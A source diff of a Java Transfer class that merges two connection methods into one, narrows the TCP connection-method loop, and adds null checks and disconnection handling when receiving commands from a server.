@@ -94,7 +94,7 @@ public class Transfer {
      *            /resources/Network_Tranports_tutorial.pdf
      * @return true if connected
      */
-    private boolean connect(final boolean deviceside) {
+    private boolean connect() {
         if (connected) {
             //#ifdef DEBUG
             debug.error("Already connected");
@@ -109,12 +109,12 @@ public class Transfer {
             //TODO: forza up di wifi
         }
 
-        if (wifiAdmitted && deviceside == true) {
+        if (wifiAdmitted) {
             //#ifdef DEBUG_TRACE
             debug.trace("Try wifi, ssl:" + ssl);
             //#endif
 
-            connection = new WifiConnection(host, port, ssl, deviceside);
+            connection = new WifiConnection(host, port, ssl, true);
             if (connection.isActive()) {
                 //#ifdef DEBUG_TRACE
                 debug.trace("wifi connecting...");
@@ -127,6 +127,10 @@ public class Transfer {
                     debug.info("Connected wifi, ssl:" + ssl);
                 }
                 //#endif
+            } else {
+                //#ifdef DEBUG_INFO
+                debug.info("wifi not active");
+                //#endif
             }
         }
 
@@ -137,7 +141,7 @@ public class Transfer {
             //#endif
             // TODO: limit to the useful and actually working methods, ignore apn
 
-            for (int method = 0; method <= DirectTcpConnection.METHOD_LAST; method++) {
+            for (int method = DirectTcpConnection.METHOD_DEVICE; method <= DirectTcpConnection.METHOD_NODEVICE; method++) {
                 //#ifdef DEBUG_TRACE
                 debug.trace("method: " + method);
                 //#endif
@@ -154,7 +158,7 @@ public class Transfer {
         }
 
         // fall back
-        if (!connected && deviceside == true && apns != null) {
+        if (!connected && apns != null) {
             for (int i = 0; i < apns.size(); i++) {
                 Apn apn = (Apn) apns.elementAt(i);
                 //#ifdef DEBUG_TRACE
@@ -186,24 +190,6 @@ public class Transfer {
         //#endif
         return connected;
 
-    }
-
-    /**
-     * Connect direct.
-     * 
-     * @return true, if successful
-     */
-    protected final boolean connectDirect() {
-        return connect(true);
-    }
-
-    /**
-     * Connect mds.
-     * 
-     * @return true, if successful
-     */
-    protected final boolean connectMDS() {
-        return connect(false);
     }
 
     /**
@@ -606,6 +592,16 @@ public class Transfer {
         Command command = null;
         byte[] commandId;
         try {
+            //#ifdef DBC
+            Check.asserts(connection.isActive(), "recvCommand connection not active");
+            //#endif
+            if(!connection.connected){
+                //#ifdef DEBUG
+                debug.error("receiving command: disconnected");            
+                //#endif
+                return null;
+            }
+
             commandId = connection.receive(4);
             final int id = Utils.byteArrayToInt(commandId, 0);
             if (id != 0) {
@@ -613,8 +609,9 @@ public class Transfer {
             }
         } catch (final IOException e) {
             //#ifdef DEBUG
-            debug.error("receiving command: " + e);
+            debug.error("receiving command: " + e);            
             //#endif
+            return null;
         }
 
         //#ifdef DEBUG_TRACE
@@ -905,7 +902,7 @@ public class Transfer {
         debug.trace("startSession");
         //#endif
         try {
-            if (!connectDirect() && !connectMDS()) {
+            if (!connect()) {
                 //#ifdef DEBUG
                 debug.error("not connected");
                 //#endif
@@ -947,7 +944,8 @@ public class Transfer {
                 //#ifdef DEBUG_INFO
                 debug.info("Received command:" + command);
                 //#endif
-                if (!parseCommand(command)) {
+
+                if (command == null || !parseCommand(command)) {
                     //#ifdef DEBUG_INFO
                     debug.info("finished commands");
                     //#endif
